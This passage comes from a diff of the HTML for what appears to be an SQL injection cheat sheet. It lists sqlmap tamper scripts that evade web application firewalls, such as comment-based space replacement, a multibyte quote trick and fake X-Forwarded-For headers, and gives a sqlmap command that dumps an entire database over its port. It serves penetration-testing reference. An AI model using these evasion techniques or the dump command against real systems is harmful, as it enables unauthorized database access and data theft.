+</span></span><span style="display:flex;"><span>| space2mssqlhash.py | Replaces space character <span style="color:#f92672">(</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">)</span> with a pound character <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;#&#39;</span><span style="color:#f92672">)</span> followed by a new line <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;\n&#39;</span><span style="color:#f92672">)</span> |
+</span></span><span style="display:flex;"><span>| space2mysqlblank.py | Replaces space character <span style="color:#f92672">(</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">)</span> with a random blank character from a valid set of alternate characters |
+</span></span><span style="display:flex;"><span>| space2mysqldash.py | Replaces space character <span style="color:#f92672">(</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">)</span> with a dash comment <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;--&#39;</span><span style="color:#f92672">)</span> followed by a new line <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;\n&#39;</span><span style="color:#f92672">)</span> |
+</span></span><span style="display:flex;"><span>| space2plus.py |  Replaces space character <span style="color:#f92672">(</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">)</span> with plus <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;+&#39;</span><span style="color:#f92672">)</span>  |
+</span></span><span style="display:flex;"><span>| space2randomblank.py | Replaces space character <span style="color:#f92672">(</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">)</span> with a random blank character from a valid set of alternate characters |
+</span></span><span style="display:flex;"><span>| symboliclogical.py | Replaces AND and OR logical operators with their symbolic counterparts <span style="color:#f92672">(&amp;&amp;</span> and <span style="color:#f92672">||)</span> |
+</span></span><span style="display:flex;"><span>| unionalltounion.py | Replaces UNION ALL SELECT with UNION SELECT |
+</span></span><span style="display:flex;"><span>| unmagicquotes.py | Replaces quote character <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;) with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| uppercase.py | Replaces each keyword character with upper case value &#39;</span>INSERT<span style="color:#e6db74">&#39;|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| varnish.py | Append a HTTP header &#39;</span>X-originating-IP<span style="color:#e6db74">&#39; |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| versionedkeywords.py | Encloses each non-function keyword with versioned MySQL comment |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| versionedmorekeywords.py | Encloses each keyword with versioned MySQL comment |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| xforwardedfor.py | Append a fake HTTP header &#39;</span>X-Forwarded-For<span style="color:#960050;background-color:#1e0010">&#39;</span> |
+</span></span></code></pre></div><h3 id="sqlmap-without-sql-injection">
   SQLmap without SQL injection
   <a class="anchor" href="#sqlmap-without-sql-injection">#</a>
 </h3>
 <p>You can use SQLmap to access a database via its port instead of a URL.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>sqlmap.py -d <span style="color:#e6db74">&#34;mysql://user:pass@ip/database&#34;</span> --dump-all 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap.py -d <span style="color:#e6db74">&#34;mysql://user:pass@ip/database&#34;</span> --dump-all 
 </span></span></code></pre></div><h2 id="authentication-bypass">
   Authentication bypass
   <a class="anchor" href="#authentication-bypass">#</a>
